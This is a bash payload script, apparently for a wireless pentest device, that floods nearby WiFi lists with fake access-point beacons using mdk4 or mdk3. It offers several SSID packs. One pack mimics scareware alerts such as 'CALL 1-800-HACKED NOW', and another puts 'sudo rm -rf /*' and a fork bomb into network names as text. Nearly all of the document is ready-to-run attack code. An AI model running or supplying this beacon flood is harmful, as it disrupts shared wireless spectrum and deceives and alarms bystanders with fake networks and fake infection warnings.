#!/bin/bash
# Title: Beacon Spam
# Author: bad-antics
# Description: Massive beacon frame spam with custom messages
# Category: nullsec

PROMPT "BEACON SPAM

Mass broadcast beacon
frames with custom SSID
messages.

Fill the WiFi list with
your custom messages!

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "SELECT MESSAGE PACK:

1. Hacker Messages
2. Love Messages
3. Movie Quotes
4. Warning Messages
5. Meme Collection
6. Custom Message

Enter number next screen."

PACK=$(NUMBER_PICKER "Pack (1-6):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PACK=1 ;; esac

rm -f /tmp/beacon_ssids.txt

case $PACK in
    1) # Hacker
cat > /tmp/beacon_ssids.txt << 'SSIDLIST'
>>> HACKED BY NULLSEC <<<
You Have Been Pwned
All Your WiFi Are Belong To Us
Password is password123
Free Virus Download Here
FBI Surveillance Van #42
NSA Mobile Unit 7
Your Printer Has Virus
sudo rm -rf /*
while(true){fork();}
Loading Virus... 100%
Hack The Planet!
SSIDLIST
        ;;
    2) # Love
cat > /tmp/beacon_ssids.txt << 'SSIDLIST'
Will You Marry Me?
I Love You Sarah
Call Me Maybe
Lonely Hearts WiFi
Looking For Love
Single and Ready to Mingle
Swipe Right on this AP
Roses Are Red WiFi is Free
Be My Valentine
SSIDLIST
        ;;
    3) # Movies
cat > /tmp/beacon_ssids.txt << 'SSIDLIST'
You shall not pass!
Luke I Am Your Router
May The WiFi Be With You
There Is No Spoon
I am Groot
To WiFi or not to WiFi
Hodor Hodor Hodor
Winter Is Coming
This is SPARTA-net!
I See Dead Packets
SSIDLIST
        ;;
    4) # Warnings
cat > /tmp/beacon_ssids.txt << 'SSIDLIST'
!!! VIRUS DETECTED !!!
CALL 1-800-HACKED NOW
Your PC Has Been Infected
Warning Malware Found
System Compromised
Data Breach in Progress
Security Alert Level 5
Ransomware Active
Firewall Breached
Emergency Alert System
SSIDLIST
        ;;
    5) # Memes
cat > /tmp/beacon_ssids.txt << 'SSIDLIST'
This WiFi is a Lie
Never Gonna Give You Up
One Does Not Simply WiFi
It's Over 9000 Mbps!
Much WiFi Very Connect
Harambe Lives Here
Hide Your Kids Hide Your WiFi
WiFi.exe Has Stopped
Doge Approved Network
Stonks Only Go Up
SSIDLIST
        ;;
    6) # Custom
        CUSTOM_MSG=$(TEXT_PICKER "Custom SSID:" "PWNED")
        for i in $(seq 1 20); do
            echo "$CUSTOM_MSG" >> /tmp/beacon_ssids.txt
        done
        ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

COUNT=$(wc -l < /tmp/beacon_ssids.txt)

resp=$(CONFIRMATION_DIALOG "Start Beacon Spam?

Pack: $PACK
Messages: $COUNT
Duration: ${DURATION}s

Press OK to begin!")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting beacon spam..."

if command -v mdk4 >/dev/null 2>&1; then
    mdk4 wlan0 b -f /tmp/beacon_ssids.txt -c 1,6,11 &
elif command -v mdk3 >/dev/null 2>&1; then
    mdk3 wlan0 b -f /tmp/beacon_ssids.txt -c 1,6,11 &
else
    ERROR_DIALOG "mdk3/mdk4 required!"
    exit 1
fi

PROMPT "BEACON SPAM ACTIVE

Broadcasting $COUNT SSIDs

Check nearby WiFi lists!

Press OK to stop."

killall mdk4 mdk3 2>/dev/null

PROMPT "BEACON SPAM STOPPED

Duration: ${DURATION}s
Messages: $COUNT

Press OK to exit."
